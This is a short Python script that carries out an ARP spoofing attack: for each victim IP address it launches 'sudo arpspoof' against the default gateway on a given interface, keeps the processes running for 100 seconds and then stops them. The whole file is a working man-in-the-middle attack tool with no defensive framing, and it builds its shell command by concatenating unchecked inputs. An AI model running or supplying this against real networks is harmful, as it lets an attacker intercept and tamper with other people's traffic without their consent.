"""
Implementing ArpSpoofing on chosen IP addresses
"""


import subprocess
import sys
import time


def stop_process(processes):
    for p in processes:
        p.terminate()


def arp_poison(victims, router, interface):
    """
    The function receives a list of IP addresses to be victims,
    Default gateway, and interface on which this network is connected,
    and implementing an ArpSpoofing attack
    :param victims: list of IP addresses to be victims.
    :param router: Default gateway.
    :param interface: interface on which this network is connected.
    :return:
    """
    processes = []

    try:
        # Get over on each victim IP
        for v in victims:
            # Indicates we get start to implement ArpSpoofing on the current victim:
            print("starting to arpSpoof from " + router + " to " + v)
            # Adding a child process that implementing the ArpSpoofing on the current victim:
            processes.append(subprocess.Popen("sudo arpspoof " + router + " -i " + interface + " -t " + v, shell=True))
        time.sleep(100)

    except KeyboardInterrupt:
        stop_process(processes)
        sys.exit(0)

    stop_process(processes)
